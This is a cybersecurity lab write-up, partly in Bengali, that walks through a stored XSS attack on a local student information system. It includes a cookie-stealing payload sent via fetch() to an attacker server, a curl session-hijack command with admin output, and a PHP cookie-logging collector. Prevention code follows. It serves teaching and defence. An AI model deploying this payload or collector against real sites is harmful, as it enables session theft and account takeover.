# 🔓 XSS Attack Documentation — Student Information System

> **⚠️ FOR EDUCATIONAL PURPOSES ONLY — Cybersecurity Lab Exercise**

---

## 📋 Attack Overview

| Field | Value |
|-------|-------|
| **Target** | Student Information System (SIS) |
| **Attack Type** | Stored XSS → Cookie Theft → Session Hijacking |
| **Payload Location** | Feedback form / Comment field |
| **Cookies Stolen** | `SIS_SESSION` |
| **Server** | `localhost:8000` |
| **Attacker Server** | `localhost:3000` |

---

## 🔄 Complete Attack Flow

### Step 1: XSS Payload Injection

**Payload:**
```html
<img src=x onerror="fetch('http://localhost:3000/api/steal.php?cookie='+document.cookie)">
```

**কী হচ্ছে:**
- Feedback form এ script tag একটা image error trigger করে
- `onerror` event এ JavaScript execute হয়
- Victim এর browser থেকে cookie টা attacker এর server এ চলে যায়
- কোনো page redirect নেই — victim জানতেও পারে না!

---

### Step 2: Collect Stolen Cookies

**Victim এর Browser (DevTools):**

1. Open DevTools → Application Tab → Cookies
2. Select `http://localhost:8000`
3. Find `SIS_SESSION` cookie
4. Copy the value:
```
SIS_SESSION=ed6699eab11a11634d8ab8e15ba5fc0f
```

---

### Step 3: Session Hijacking via cURL

**Command:**
```bash
curl -v "http://localhost:8000/student-information-system/backend/api/auth/check.php" \
  --cookie "SIS_SESSION=ed6699eab11a11634d8ab8e15ba5fc0f"
```

**Output:**
```json
{
  "status": true,
  "message": "Authenticated",
  "user": {
    "id": 1,
    "full_name": "Administrator",
    "username": "admin",
    "email": "admin@sis.local"
  },
  "csrf_token": "adfd21666e3709f890880d261805d4f0916dee997ba7cfb13f1b9a6381912097"
}
```

**Result:** ✅ Session hijack successful!
- Victim এর account এ access পাওয়া গেছে
- Admin panel এ login করা সম্ভব
- CSRF token পাওয়া গেছে (future attacks এর জন্য)

---

### Step 4: Save User Information

**DevTools → Local Storage:**

```
Key: sis_user
Value: {"id":1,"full_name":"Administrator","username":"admin","email":"admin@sis.local"}

Key: csrf_token
Value: adfd21666e3709f890880d261805d4f0916dee997ba7cfb13f1b9a6381912097
```

---

## 🧠 What We Learned

### XSS Attack Chain:
```
1. Inject Malicious Script → Feedback Form
2. Script Stored in Database (raw HTML)
3. Victim visits page → Script executes in their browser
4. JavaScript sends cookies to attacker's server
5. Attacker collects stolen cookies
6. Attacker uses cookies to impersonate victim
7. Full Account Takeover! 🔓
```

### Why This Works:
| Vulnerability | Explanation |
|---------------|-------------|
| **Stored XSS** | Comment stored without sanitization |
| **No HttpOnly Flag** | JavaScript can read cookies |
| **No CSRF Protection** | Cookie alone is enough for auth |
| **No CSP Header** | Inline scripts execute freely |

---

## 🛡️ Prevention (How to Fix)

```php
// ✅ 1. Sanitize all user input
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');

// ✅ 2. Set cookie with HttpOnly flag
session_set_cookie_params([
    'httponly' => true,   // JavaScript can't read
    'secure'   => true,   // HTTPS only
    'samesite' => 'Strict' // No cross-site sending
]);

// ✅ 3. Regenerate session after login
session_regenerate_id(true);

// ✅ 4. Add CSRF tokens to all forms
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// ✅ 5. Content Security Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

---

## 📁 Code Example: steal.php (Attacker Server)

```php
<?php
// api/steal.php — Captures stolen cookies
if (isset($_GET['cookie']) && !empty($_GET['cookie'])) {
    $cookie    = $_GET['cookie'];
    $timestamp = date('Y-m-d H:i:s');
    $ip        = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = substr($_SERVER['HTTP_USER_AGENT'] ?? 'unknown', 0, 120);

    $entry = "$timestamp | $cookie | IP: $ip | UA: $userAgent\n";
    file_put_contents(__DIR__ . '/../data/cookies.txt', $entry, FILE_APPEND | LOCK_EX);
}

// Return transparent GIF (invisible to victim)
header('Content-Type: image/gif');
header('Cache-Control: no-cache, no-store, must-revalidate');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
```

---

## 📊 Attack Summary

| # | Step | Status |
|---|------|--------|
| 1 | XSS Payload Injection | ✅ Success |
| 2 | Cookie Theft | ✅ Success |
| 3 | Session Hijack (cURL) | ✅ Success |
| 4 | User Info Extraction | ✅ Success |
| 5 | Full Account Takeover | ✅ Success |

---

## ⚠️ Disclaimer

> **This documentation is for EDUCATIONAL PURPOSES ONLY.**
>
> - Demonstrates real-world XSS attack vectors
> - Use only in controlled lab environments
> - Do NOT use against systems without authorization
> - Unauthorized access is illegal under CFAA

---

*📅 Created: June 13, 2026*
*🎓 Cybersecurity Lab — XSS Session Hijacking Demonstration*
